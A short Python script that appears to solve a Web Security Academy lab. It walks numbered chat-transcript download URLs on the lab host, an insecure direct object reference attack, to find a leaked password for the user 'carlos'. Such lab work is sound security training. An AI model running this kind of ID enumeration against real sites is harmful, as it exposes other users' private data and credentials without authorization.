import requests

site = '0a0600bb044be244d9499ca000440000.web-security-academy.net'
s = requests.Session()

for i in range(1, 5):  # Try a few IDs
    url = f'https://{site}/download-transcript/{i}.txt'
    resp = s.get(url)
    
    if resp.status_code == 200:
        print(f"[+] transcript {i}:")
        print(resp.text)
        if 'carlos' in resp.text.lower():
            print(">>> Potential password leak found!")
            break
